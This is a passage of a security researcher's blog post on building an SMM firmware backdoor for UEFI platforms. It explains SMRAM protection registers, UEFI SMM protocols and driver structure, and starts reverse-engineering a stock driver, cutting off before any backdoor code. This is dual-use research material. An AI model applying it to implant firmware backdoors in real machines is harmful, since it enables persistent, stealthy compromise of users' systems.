</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<!-- corrects IE6 width calculation -->
<div class="columns-inner">
<div class="column-center-outer">
<div class="column-center-inner">
<div class="main section" id="main"><div class="widget Blog" id="Blog1">
<div class="blog-posts hfeed">
<!-- google_ad_section_start(name=default) -->

          <div class="date-outer">
        
<h2 class="date-header"><span>Sunday, July 5, 2015</span></h2>

          <div class="date-posts">
        
<div class="post-outer">
<div class="post hentry">
<a name="1711940776197401016"></a>
<h3 class="post-title entry-title">
Building reliable SMM backdoor for UEFI based platforms
</h3>
<div class="post-header">
<div class="post-header-line-1"></div>
</div>
<div class="post-body entry-content">
<a href="https://en.wikipedia.org/wiki/System_Management_Mode">System Management Mode</a>
 is apparently one of the coolest dark corners of Intel IA-32 
architecture. Last several months I spent with learning about SMM and 
coding SMM backdoor for UEFI based platforms as weekend day project, in 
this article I want to share the backdoor source code with you and 
explain how it works.<br>
<br>
GitHub project page:&nbsp;<a href="https://github.com/Cr4sh/SmmBackdoor">https://github.com/Cr4sh/SmmBackdoor</a><br>
<br>
Actually, the story started when I was inspired by recent research about SMM vulnerabilities by Intel Security ("<a href="https://cansecwest.com/slides/2015/A%20New%20Class%20of%20Vulnin%20SMI%20-%20Andrew%20Furtak.pdf">A New Class of Vulnerabilities in SMI Handlers</a>") and LegbaCore ("￼<a href="http://legbacore.com/Research_files/HowManyMillionBIOSWouldYouLikeToInfect_Full2.pdf">How Many Million BIOSes Would you Like to Infect?</a>")
 teams and decided to audit the firmware of my Intel DQ77KB motherboard 
for similar vulnerabilities. For reverse engineering of SMM code you 
need to dump somehow a System Management Mode RAM where it lives, which 
is not that easy. The most obvious ways to do it — patch motherboard 
firmware and disable SMRAM protection to make it accessible for non-SMM 
code, or write exploit for some firmware vulnerability that allows to 
read SMRAM contents, like boot script table vulnerability (<a href="https://www.kb.cert.org/vuls/id/976132">CERT VU #976132</a>) that was described in my <a href="http://blog.cr4.sh/2015/02/exploiting-uefi-boot-script-table.html">previous blog post about UEFI</a>.
 Significant disadvantage of both these ways — they're very model 
specific and you may spend unpredictable amount of time porting them to 
some new test platform. To achieve a better solution I decided to code 
some firmware backdoor that runs in SMM and provides an interface that 
allows to dump SMRAM from less privileged code and do some other useful 
things. Also, later I wrote additional backdoor payload that allows to 
escalate privileges of user mode processes under 64-bit GNU/Linux 
operating system using SMM magic. Of course, this backdoor is rather 
research tool than malware — to install it you need to have a hardware 
SPI programmer and physical access to the target machine, but as was 
shown by other researchers — it’s also possible to weaponise such 
backdoor with proper UEFI exploit that allows to infect the firmware 
form running operating system in software only way.<br>
<br>
SMM security is not a new theme among researchers, in last 10 years 
there was a lot of publications about SMM itself and it’s usage for 
different kind of evil purposes:<br>
<br>
<ul>
<li>"<a href="http://cs.usfca.edu/%7Ecruse/cs630f06/duflot.pdf">Using CPU System Management Mode to Circumvent Operating System Security Functions</a>"</li>
<li>"<a href="http://phrack.org/issues/65/7.html">System Management Mode Hack, Using SMM for Other Purposes</a>"</li>
<li>"<a href="http://phrack.org/issues/66/11.html">A Real SMM Rootkit: Reversing and Hooking BIOS SMI Handlers</a>"</li>
<li>"<a href="http://www.eecs.ucf.edu/%7Eczou/research/SMM-Rootkits-Securecom08.pdf">SMM Rootkits: A New Breed of OS Independent Malware</a>"</li>
</ul>
<br>
However, the most part of these research was done during legacy BIOS era
 and nowadays, when PC vendors had switched from legacy BIOS to UEFI, 
SMM security is actual like never before with it’s UEFI related aspects.<br>
<br>
<h3>
System Management Mode basics</h3>
<br>
SMM is a special execution mode of IA-32 architecture that was introduced with i386, chapter 34 of <a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html">Intel 64 and IA-32 Architectures Software Developer’s Manual</a> is the main information source about it’s design and usage:<br>
<br>
<i>SMM is a special-purpose operating mode provided for handling 
system-wide functions like power management, system hardware control, or
 proprietary OEM-designed code. It is intended for use only by system 
firmware, not by applications software or general-purpose systems 
software. The main benefit of SMM is that it offers a distinct and 
easily isolated processor environment that operates transparently to the
 operating system or executive and software applications.</i><br>
<br>
Some time ago SMM was used by BIOS developers mostly for power 
management and legacy devices emulation, for example, PS/2 support (port
 60h/64h) for USB keyboard and mouse. Nowadays it's also widely used for
 firmware and platform security purposes.<br>
<br>
Why SMM is interesting for hackers?<br>
<br>
<ul>
<li>In UEFI specification SMM plays very important role for implementing
 of platform security mechanisms that protects firmware image stored 
inside flash chip on motherboard from unauthorised modifications by 
malicious software.</li>
<li>SMM is excellent place to hide OS independent and invisible malware.
 This execution mode has extreme power over all of the other software 
that runs on CPU, even OS kernel or VT-x hypervisor.</li>
</ul>
<br>
SMM executable code and data lives inside SMRAM and when SMRAM is locked
 — it can't be accessed by code of operating system or user mode 
software. System firmware (legacy BIOS or UEFI) copies SMM code into 
SMRAM and locks it during platform initialization.<br>
<br>
Processor is switching to SMM only trough System Management Interrupt 
(SMI), it saving current execution context into SMRAM and start 
executing SMI handler that can exit from SMM and resume execution from 
saved context using <span style="font-family: Courier New, Courier, monospace;">RSM</span> instruction.<br>
<br>
System Management Interrupt has the highest priority and can’t be 
masked. Most important facts about SMI handler execution environment:<br>
<br>
<ul>
<li>Similar to 16-bit real address mode with paging disabled.</li>
<li>CS segment base is SMRAM base, EIP is 8000h.</li>
<li>Segment limits are set to 4 GBytes, you can switch to protected mode or long mode to access all of the physical memory.</li>
<li>All I/O ports are available.</li>
<li>SMM code can read or modify saved execution context.</li>
<li>SMM code can set it’s own IDT and use software interrupts.</li>
</ul>
<br>
As you can see, SMM code completely unaccessible from OS and OS can’t 
even notice when exactly SMI is being executed. There’s a several ways 
to generate SMI:<br>
<br>
<ul>
<li>Ring 0 code can trigger software SMI at any time by writing some byte value to APMC I/O port B2h.</li>
<li>Internal chipset registers (<span style="font-family: Courier New, Courier, monospace;">SMI_EN</span>, <span style="font-family: Courier New, Courier, monospace;">GEN_PMCON_1</span> and others) that accessible via PCI config space allows to enable or disable different kind of hardware SMI sources.</li>
<li>You can route hardware interrupts into SMM by reconfiguring of 
advanced programmable interrupt controller (APIC) that integrated into 
CPU.</li>
<li>I/O instruction restart CPU feature (chapter 34.12 of IA-32 
Architectures Software Developer’s Manual) allows to generate SMI on any
 I/O port access by <span style="font-family: Courier New, Courier, monospace;">IN</span> or <span style="font-family: Courier New, Courier, monospace;">OUT</span> processor instruction.</li>
</ul>
<br>
SMRAM can be located in Compatible Memory Segment (CSEG), High Memory 
Segment (HSEG) or Top of Memory Segment (TSEG) system memory regions. 
Actually, the memory management features behind SMM and SMRAM are 
hardware-specific, I’m using <a href="http://www.intel.com/content/www/us/en/motherboards/desktop-motherboards/desktop-board-dq77kb.html">Intel DQ77KB motherboard</a> with Core i5-2500 CPU as test platform, so, information in this article will be provided in according to following datasheets:<br>
<br>
<ul>
<li><span id="goog_1171219358"></span>2nd Generation Intel Core Processor Family Desktop datasheet (<a href="http://www.intel.com/content/dam/www/public/us/en/documents/datasheets/2nd-gen-core-desktop-vol-1-datasheet.pdf">volume 1</a> and <a href="http://www.intel.com/content/dam/www/public/us/en/documents/datasheets/2nd-gen-core-desktop-vol-2-datasheet.pdf">volume 2</a>)<span id="goog_1171219359"></span></li>
<li><a href="http://www.intel.com/content/dam/www/public/us/en/documents/datasheets/7-series-chipset-pch-datasheet.pdf">Intel 7 Series Chipset Family Platform Controller Hub (PCH) datasheet</a></li>
</ul>
<br>
CSEG is a default region of SMRAM that located at fixed address range of non-cacheable physical memory <span style="font-family: Courier New, Courier, monospace;">A0000h:BFFFFh</span>
 (it overlaps VGA memory). CSEG was used mostly by legacy BIOS 
developers, modern systems can use (and actually uses) other locations 
of SMRAM: HSEG or TSEG. They can offer 8 MB of cacheable memory for SMM 
code and data which should be enough even for relatively complicated 
UEFI SMM Foundation core and drivers.<br>
<br>
Here you can see physical memory map from processor datasheet:<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://dl.dropboxusercontent.com/u/22903093/blog/uefi-smm-backdoor/phys-mem-map.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/phys-mem-map.png" style="border: 0px;" height="712" width="608"></a></div>
<br>
CSEG located inside legacy address range below first MB of memory. You 
may notice, that there’s no HSEG area on the picture — my CPU is not 
supporting it. The interesting thing about TSEG — CPU stores it’s 
address inside internal register that not accessible by software 
directly, this value is calculating automatically in following way:<br>
<br>
<span style="font-family: Courier New, Courier, monospace;">TSEG ADDR = TOLUD – DSM SIZE – GSM SIZE – TSEG SIZE</span><br>
<br>
... where <span style="font-family: Courier New, Courier, monospace;">TOLUD</span> — Top of Low Usable DRAM, <span style="font-family: Courier New, Courier, monospace;">DSM SIZE</span> — size of Data of Stolen Memory, <span style="font-family: Courier New, Courier, monospace;">GSM SIZE</span> — size of GTT Stolen Memory.<br>
<br>
System Management RAM Control register (<span style="font-family: Courier New, Courier, monospace;">SMRAMC</span>)
 controls the presence of CSEG/HSEG/TSEG regions and their accessibility
 from less privileged than SMM execution modes. Here’s the description 
of it’s bits:<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://dl.dropboxusercontent.com/u/22903093/blog/uefi-smm-backdoor/smramc.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/smramc.png" style="border: 0px;" height="623" width="579"></a></div>
<br>
System firmware sets <span style="font-family: Courier New, Courier, monospace;">SMRAMC</span>
 value during platform initialization and locks the register — all 
fields becomes read-only till the next full reset. On properly 
configured system <span style="font-family: Courier New, Courier, monospace;">D_LCK</span> must be 1 and <span style="font-family: Courier New, Courier, monospace;">D_OPEN</span> must be 0, which means that SMRAM memory will be accessible only from code that runs in SMM. <span style="font-family: Courier New, Courier, monospace;">G_SMRAME</span> field controls presence of CSEG and <span style="font-family: Courier New, Courier, monospace;">C_BASE_SEG</span> is responsible for HSEG and TSEG. On my hardware <span style="font-family: Courier New, Courier, monospace;">C_BASE_SEG</span> is read-only with predefined value 010b.<br>
<br>
There’s also other registers that should be properly configured and locked by firmware to protect SMRAM from various attacks:<br>
<br>
<ul>
<li>Top of Upper Usable DRAM (<span style="font-family: Courier New, Courier, monospace;">TOUUD</span>), Top of Low Usable DRAM (<span style="font-family: Courier New, Courier, monospace;">TOLUD</span>), <span style="font-family: Courier New, Courier, monospace;">REMAPLIMIT</span> and <span style="font-family: Courier New, Courier, monospace;">REMAPBASE</span>
 registers that used to configure physical memory map must be locked by 
firmware to protect SMRAM from memory remapping attacks. For more 
information check "<a href="http://www.ssi.gouv.fr/uploads/IMG/pdf/IT_Defense_2010_final.pdf">System Management Mode Design and Security Issues</a>" and "<a href="http://www.invisiblethingslab.com/resources/bh08/part2-full.pdf">Preventing and Detecting Xen Hypervisor Subversions</a>" white papers.</li>
<li><span style="font-family: Courier New, Courier, monospace;">TSEGMB</span>
 register defines address of memory region that should be protected from
 DMA access, firmware must configure and lock it. For more information 
check "<a href="https://bromiumlabs.files.wordpress.com/2015/01/venamis_whitepaper.pdf">Attacking UEFI Boot Script</a>" white paper.</li>
<li>System Management Range Registers (SMRR) — a pair of <span style="font-family: Courier New, Courier, monospace;">IA32_SMRR_PHYSBASE</span> and <span style="font-family: Courier New, Courier, monospace;">IA32_SMRR_PHYSMASK</span>
 MSR registers that can be modified only by SMM code. Because HSEG and 
TSEG memory is cacheable — SMRR must be configured to protect it from 
SMM cache poisoning attacks. For more information check "<a href="http://www.invisiblethingslab.com/resources/misc09/smm_cache_fun.pdf">Attacking SMM Memory via Intel CPU Cache Poisoning</a>" white paper.</li>
</ul>
<br>
<h3>
UEFI SMM foundation</h3>
<br>
Unified Extensible Firmware Interface (UEFI) is a standard firmware 
architecture for PC that used in most of the modern computers and 
notebooks available at the market. UEFI provides a lot of abstractions 
over architectural mechanisms of SMM that was described above. For more 
information about UEFI design please refer to <a href="http://www.uefi.org/specifications">UEFI Platform Initialization Specification</a>.<br>
<br>
UEFI boot sequence consists from several <a href="http://tianocore.sourceforge.net/wiki/PI_Boot_Flow">platform initialization (PI) phases</a>, each PI phase has it’s own execution environment and API:<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://dl.dropboxusercontent.com/u/22903093/blog/uefi-smm-backdoor/uefi-boot-sequence.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/uefi-boot-sequence.png" style="border: 0px;" height="378" width="679"></a></div>
<br>
PEI phase was described in my previous article about UEFI boot script 
table vulnerability, S3 resume boot path that was mentioned in that 
article is not shown on picture above.<br>
<br>
DXE phase begins when PEI core transfers execution to <span style="font-family: Courier New, Courier, monospace;">DxeMain()</span>
 function of DXE core module that stored on Firmware File System (FFS) 
image inside ROM chip on motherboard. DXE core loads other DXE drivers 
from FFS, these drivers can use EFI boot services (described by <span style="font-family: Courier New, Courier, monospace;"><a href="http://wiki.phoenix.com/wiki/index.php/EFI_BOOT_SERVICES">EFI_BOOT_SERVICES</a></span> structure) and EFI runtime services (described by <span style="font-family: Courier New, Courier, monospace;"><a href="http://wiki.phoenix.com/wiki/index.php/EFI_RUNTIME_SERVICES">EFI_RUNTIME_SERVICES</a></span> structure). This phase is a quite similar to PEI: loaded DXE drivers can register new UEFI protocol interfaces using <span style="font-family: Courier New, Courier, monospace;">EFI_BOOT_SERVICES.RegisterProtoclInterface()</span> function, get notifications about some protocol registration using <span style="font-family: Courier New, Courier, monospace;">EFI_BOOT_SERVICES.RegisterProtoclNotify()</span> or lookup existing protocols using <span style="font-family: Courier New, Courier, monospace;">EFI_BOOT_SERVICES.LocateProtocol()</span> and <span style="font-family: Courier New, Courier, monospace;">EFI_BOOT_SERVICES.LocateHandle()</span>. DXE phase ends when EFI OS loader calls <span style="font-family: Courier New, Courier, monospace;">EFI_BOOT_SERVICES.ExitBootServices()</span> function that transfers execution to operating system kernel. During runtime phase only functions of <span style="font-family: Courier New, Courier, monospace;">EFI_RUNTIME_SERVICES</span> are available for running OS.<br>
<br>
SMM phase is optional phase that starts in DXE and runs in parallel with
 other PI phases into runtime. Volume 4 of Platform Initialization 
Specification — System Management Mode Core Interface, told us that SMM 
phase consists from two parts:<br>
<br>
<ul>
<li>SMRAM initialization — during DXE, an SMM related driver opens 
SMRAM, creates the SMRAM memory map and provides the necessary services 
to launch SMM-related drivers and then, before boot, close and lock 
SMRAM.</li>
<li>SMI management — when an SMI generated, the driver execution 
environment is created and then the SMI sources are detected and SMI 
handlers called.</li>
</ul>
<br>
<a href="https://github.com/tianocore/edk2">EFI Development Kit II source code</a>
 has open source implementation of SMM protocols but the code isn't 
complete because these protocols are hardware specific, to get more 
useful implementation you may have a look at the&nbsp;<a href="https://downloadcenter.intel.com/download/23197/Intel-Quark-BSP">Intel Quark Board Support Package</a>. Please note, that Quark BSP supports only i386 architecture (<a href="https://en.wikipedia.org/wiki/Intel_Quark">Intel Quark SoC</a> has no long mode support) while UEFI firmware of most of the PC's uses x86_64 code for SMM. Also, "<a href="http://www.mirrorservice.org/sites/downloads.sourceforge.net/e/ed/edk2/General%20Documentation/EDK%20II%20SMM%20call%20topology.pdf">EDK II SMM call topology</a>" document provides an excellent walkthrough for these open source projects.<br>
<br>
SMM phase is starts with cooperation of several DXE drivers that should implement the following UEFI protocols:<br>
<br>
<ul>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_ACCESS2_PROTOCOL</span> — describes the different SMRAM regions available in the system.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_CONTROL2_PROTOCOL</span> — used to initiate synchronous SMI activations.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_BASE2_PROTOCOL</span> — used to locate the System Management Services Table (SMST) during SMM driver initialization.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_CONFIGURATION_PROTOCOL</span>
 — mandatory protocol published by a DXE CPU driver to indicate which 
areas within SMRAM are reserved for use by the CPU for any purpose, such
 as stack, save state or SMM entry point.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_COMMUNICATION_PROTOCOL</span> — provides a means of communicating between drivers outside of SMM and SMI handlers inside of SMM.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_DXE_SMM_READY_TO_LOCK_PROTOCOL</span>
 — mandatory protocol published by a DXE driver to indicate that SMM is 
about to be locked. Registration notify of this protocol is usually 
invoking the <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_ACCESS2_PROTOCOL.Lock()</span> function to lock SMRAM.</li>
</ul>
<br>
<span style="font-family: Courier New, Courier, monospace;">EFI_SMM_ACCESS2_PROTOCOL</span>, <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_CONTROL2_PROTOCOL</span> and <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_BASE2_PROTOCOL</span> are presents starting from 1.0 version of Platform Initialization Specification, they replaces <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_ACCESS_PROTOCOL</span>, <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_CONTROL_PROTOCOL</span> and <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_BASE_PROTOCOL</span>
 from previous versions of specification. Nowadays the most of BIOS 
vendors uses new protocols, but some old hardware may support only old, 
which means that reliable SMM backdoor for real life purposes should be 
able to work with the both of these protocols&nbsp;sets.<br>
<br>
There’s a three types of DXE phase drivers involved in SMM initialization:<br>
<br>
<ul>
<li>DXE drivers — regular DXE phase drivers that loads into system memory by DXE core driver.</li>
<li>SMM drivers — SMM Drivers are launched once, directly into SMRAM during SMM phase initialization.</li>
<li>SMM/DXE combined drivers — Combination of drivers that loaded twice: as DXE driver and as SMM driver.</li>
</ul>
<br>
All these drivers has a same signature of the entry point function:<br>
<pre style="overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #7f0055; font-weight: bold;">typedef</span>
EFI_STATUS
(EFIAPI * EFI_IMAGE_ENTRY_POINT) (
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
);
</pre>
<br>
SMM and SMM/DXE combined drivers can use <span style="font-family: Courier New, Courier, monospace;">EFI_BOOT_SERVICES</span>
 functions and DXE protocols only at entry point, protocols and 
callbacks that being invoked during SMI management should use only SMST 
functions and SMM protocols.<br>
<br>
Here is SMM system table structure from EDK2 source with some of my additional comments:<br>
<pre style="overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #3f7f59;">//</span>
<span style="color: #3f7f59;">// System Management System Table (SMST)</span>
<span style="color: #3f7f59;">//</span>
<span style="color: #3f7f59;">// The System Management System Table (SMST) is a table that contains a collection of common </span>
<span style="color: #3f7f59;">// services for managing SMRAM allocation and providing basic I/O services. These services are </span>
<span style="color: #3f7f59;">// intended for both preboot and runtime usage.</span>
<span style="color: #3f7f59;">//</span>
<span style="color: #7f0055; font-weight: bold;">struct</span> _EFI_SMM_SYSTEM_TABLE2 
{
    <span style="color: #3f7f59;">// The table header for the SMST.</span>
    EFI_TABLE_HEADER Hdr;

    <span style="color: #3f7f59;">// A pointer to a NULL-terminated Unicode string containing the vendor name.</span>
    <span style="color: #3f7f59;">// It is permissible for this pointer to be NULL.</span>
    CHAR16 *SmmFirmwareVendor;
    
    <span style="color: #3f7f59;">// The particular revision of the firmware.</span>
    UINT32 SmmFirmwareRevision;

    <span style="color: #3f7f59;">// Adds, updates, or removes a configuration table entry from the SMST.</span>
    EFI_SMM_INSTALL_CONFIGURATION_TABLE2 SmmInstallConfigurationTable; 

    <span style="color: #3f7f59;">// I/O Service</span>
    EFI_SMM_CPU_IO2_PROTOCOL SmmIo;

    <span style="color: #3f7f59;">//</span>
    <span style="color: #3f7f59;">// Runtime memory services                               </span>
    <span style="color: #3f7f59;">//</span>

    <span style="color: #3f7f59;">// Allocates pool memory from SMRAM.</span>
    EFI_ALLOCATE_POOL SmmAllocatePool;

    <span style="color: #3f7f59;">// Returns SMRAM pool memory to system.</span>
    EFI_FREE_POOL SmmFreePool;
 
    <span style="color: #3f7f59;">// Allocates page memory from SMRAM.</span>
    EFI_ALLOCATE_PAGES SmmAllocatePages;

    <span style="color: #3f7f59;">// Returns pages of memory to the system.</span>
    EFI_FREE_PAGES SmmFreePages;

    <span style="color: #3f7f59;">// Execute caller-provided code stream on one distinct application processor while in SMM.</span>
    EFI_SMM_STARTUP_THIS_AP SmmStartupThisAp;
                                                              
    <span style="color: #3f7f59;">//</span>
    <span style="color: #3f7f59;">// CPU information records</span>
    <span style="color: #3f7f59;">//</span>

    <span style="color: #3f7f59;">// A number between zero and and the NumberOfCpus field. This field designates </span>
    <span style="color: #3f7f59;">// which processor is executing the SMM infrastructure.</span>
    UINTN CurrentlyExecutingCpu;
    
    <span style="color: #3f7f59;">// The number of possible processors in the platform.  This is a 1 based counter.</span>
    UINTN NumberOfCpus;
    
    <span style="color: #3f7f59;">// Points to an array, where each element describes the number of bytes in the </span>
    <span style="color: #3f7f59;">// corresponding save state specified by CpuSaveState. There are always </span>
    <span style="color: #3f7f59;">// NumberOfCpus entries in the array. </span>
    UINTN *CpuSaveStateSize;
    
    <span style="color: #3f7f59;">// Points to an array, where each element is a pointer to a CPU save state. The </span>
    <span style="color: #3f7f59;">// corresponding element in CpuSaveStateSize specifies the number of bytes in the </span>
    <span style="color: #3f7f59;">// save state area. There are always NumberOfCpus entries in the array.</span>
    <span style="color: #7f0055; font-weight: bold;">VOID</span> **CpuSaveState;      

    <span style="color: #3f7f59;">//</span>
    <span style="color: #3f7f59;">// Extensibility table</span>
    <span style="color: #3f7f59;">//</span>

    <span style="color: #3f7f59;">// The number of UEFI Configuration Tables in the buffer SmmConfigurationTable.</span>
    UINTN NumberOfTableEntries;
    
    <span style="color: #3f7f59;">// A pointer to the UEFI Configuration Tables. The number of entries in the table is </span>
    <span style="color: #3f7f59;">// NumberOfTableEntries. </span>
    EFI_CONFIGURATION_TABLE *SmmConfigurationTable;

    <span style="color: #3f7f59;">//</span>
    <span style="color: #3f7f59;">// Protocol services</span>
    <span style="color: #3f7f59;">//</span>

    <span style="color: #3f7f59;">// Installs a SMM protocol interface.</span>
    EFI_INSTALL_PROTOCOL_INTERFACE SmmInstallProtocolInterface;

    <span style="color: #3f7f59;">// Removes a SMM protocol interface.</span>
    EFI_UNINSTALL_PROTOCOL_INTERFACE SmmUninstallProtocolInterface;

    <span style="color: #3f7f59;">// Queries a handle to determine if it supports a specified SMM protocol.</span>
    EFI_HANDLE_PROTOCOL SmmHandleProtocol;
                                                                          
    <span style="color: #3f7f59;">// Register a callback function be called when a particular protocol interface is installed.</span>
    EFI_SMM_REGISTER_PROTOCOL_NOTIFY SmmRegisterProtocolNotify;

    <span style="color: #3f7f59;">// Returns an array of handles that support a specified protocol.</span>
    EFI_LOCATE_HANDLE SmmLocateHandle;

    <span style="color: #3f7f59;">// Returns the first SMM protocol instance that matches the given protocol.</span>
    EFI_LOCATE_PROTOCOL SmmLocateProtocol;

    <span style="color: #3f7f59;">//</span>
    <span style="color: #3f7f59;">// SMI Management functions</span>
    <span style="color: #3f7f59;">//</span>

    <span style="color: #3f7f59;">// Manage SMI of a particular type.</span>
    EFI_SMM_INTERRUPT_MANAGE SmiManage;
 
    <span style="color: #3f7f59;">// Registers a handler to execute within SMM.</span>
    EFI_SMM_INTERRUPT_REGISTER SmiHandlerRegister;
 
    <span style="color: #3f7f59;">// Unregister a handler in SMM.</span>
    EFI_SMM_INTERRUPT_UNREGISTER SmiHandlerUnRegister;
};
</pre>
<br>
In addition to previously described protocols for DXE phase, SMM drivers
 also can use the following SMM-only protocols during SMI management:<br>
<br>
<ul>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_STATUS_CODE_PROTOCOL</span> — reports SMM code errors to other UEFI PI components.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_CPU_PROTOCOL</span> — provides access to saved CPU execution state.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_CPU_IO2_PROTOCOL</span> — provides CPU I/O and memory access for SMM code.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_PCI_ROOT_BRIDGE_IO_PROTOCOL</span>
 — provides the basic memory, I/O, PCI configuration, and DMA interfaces
 that are used to abstract accesses to PCI controllers behind a PCI root
 bridge controller.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_READY_TO_LOCK_SMM_PROTOCOL</span> — mandatory protocol published by the SMM Foundation to indicate that SMRAM is about to be locked.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_END_OF_DXE_PROTOCOL</span> — similar to <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_READY_TO_LOCK_SMM_PROTOCOL</span>,
 published by the PI platform code prior to invoking any 3rd party 
content, including options ROM’s and UEFI executables that are not from 
the platform manufacturer.</li>
</ul>
<br>
<h3>
Writing SMM/DXE combined drivers</h3>
<br>
SMM/DXE combined drivers looks very neat for evil purposes: you can have
 a single backdoor with ability to execute the both of DXE and SMM phase
 payloads.<br>
<br>
I expected a difficulties with finding of usable example of such drivers
 in public sources like EDK2, Quark BSP or others. Actually, there's 
only two publicly available articles about UEFI SMM drivers development:
 "<a href="https://docs.google.com/file/d/0B3M7WqiAoyr_NWI2NjdhYWUtMjE1NS00Njc2LThmZjItNWExZDZkYzUzMjJk/edit?authkey=CM6a8JYE&amp;ddrp=1&amp;hl=en#">EFI Howto, Write a SMM Driver</a>" and "<a href="http://blogs.phoenix.com/phoenix_technologies_bios/2008/12/bios-undercover-writing-a-software-smi-handler.html">BIOS Undercover: Writing A Software SMI Handler</a>" — both of them are outdated, incomplete or vendor-specific.<br>
<br>
To learn how to write combined drivers I decided to make a short reverse
 engineering of existing combined driver from my motherboard’s firmware.
 This time I used <a href="https://github.com/LongSoft/UEFITool">UEFITool by Nikolaj Schlej</a>
 to work with flash image, if you need to do firmware modification and 
rebuild — this excellent tool works much more better than&nbsp;<a href="https://github.com/theopolis/uefi-firmware-parser">uefi-firmware-parser</a> that was mentioned in my previous article.<br>
<br>
As my target I took combined driver named <span style="font-family: Courier New, Courier, monospace;">26A2481E-4424-46A2-9943-CC4039EAD8F8</span> (<a href="https://www.google.com/search?q=26A2481E-4424-46A2-9943-CC4039EAD8F8">Google tells</a> that this GUID belongs to S3Save UEFI driver but for our purposes it's doesn’t matter):<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://dl.dropboxusercontent.com/u/22903093/blog/uefi-smm-backdoor/uefi-tool.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/uefi-tool.png" style="border: 0px;" height="330" width="656"></a></div>
<br>
After extracting of driver’s body let’s load it into the IDA Pro and 
observe a code around module entry point. PEI modules reverse 
engineering tips and tricks from previous article are applicable to DXE 
and SMM drivers as well, there’s only one major difference — DXE and SMM
 phase code uses x86_64 architecture instead of i386 for PEI.<br>
<pre style="overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #7f0055; font-weight: bold;">DWORD</span> <span style="color: #7f0055; font-weight: bold;">__stdcall</span> EntryPoint(<span style="color: #7f0055; font-weight: bold;">PVOID</span> ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_SYSTEM_TABLE *v2; <span style="color: #3f7f59;">// rbx@1</span>
    <span style="color: #7f0055; font-weight: bold;">PVOID</span> v3; <span style="color: #3f7f59;">// rdi@1</span>

    v2 = SystemTable;
    v3 = ImageHandle;

    <span style="color: #3f7f59;">// initialize global variables for image handle and system tables</span>
    sub_180002074(ImageHandle, SystemTable);

    <span style="color: #3f7f59;">// do the stuff</span>
    <span style="color: #7f0055; font-weight: bold;">return</span> sub_180001FD0(v3, v2);
}

EFI_RUNTIME_SERVICES * <span style="color: #7f0055; font-weight: bold;">__fastcall</span> sub_180002074(<span style="color: #7f0055; font-weight: bold;">PVOID</span> ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_RUNTIME_SERVICES *v2; <span style="color: #3f7f59;">// rax@2</span>

    <span style="color: #7f0055; font-weight: bold;">if</span> (!gST)
    {
        gST = SystemTable;
        gBS = SystemTable-&gt;BootServices;
        v2 = SystemTable-&gt;RuntimeServices;
        gImageHandle = ImageHandle;
        gRuntimeServices = v2;
    }

    <span style="color: #7f0055; font-weight: bold;">return</span> v2;
}

<span style="color: #7f0055; font-weight: bold;">DWORD</span> <span style="color: #7f0055; font-weight: bold;">__fastcall</span> sub_180001FD0(<span style="color: #7f0055; font-weight: bold;">PVOID</span> ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_SYSTEM_TABLE *v2; <span style="color: #3f7f59;">// rbx@1</span>
    <span style="color: #7f0055; font-weight: bold;">PVOID</span> v3; <span style="color: #3f7f59;">// rdi@1</span>
    <span style="color: #7f0055; font-weight: bold;">__int64</span> v4; <span style="color: #3f7f59;">// rax@1</span>
    <span style="color: #7f0055; font-weight: bold;">char</span> v6; <span style="color: #3f7f59;">// [sp+38h] [bp+10h]@1</span>

    v2 = SystemTable;
    v3 = ImageHandle;
    bInSmm = 0;

    <span style="color: #3f7f59;">// perform various initializations</span>
    sub_180002074(ImageHandle, SystemTable);

    <span style="color: #3f7f59;">// locate EFI_SMM_BASE2_PROTOCOL</span>
    LODWORD(v4) = v2-&gt;BootServices-&gt;LocateProtocol(
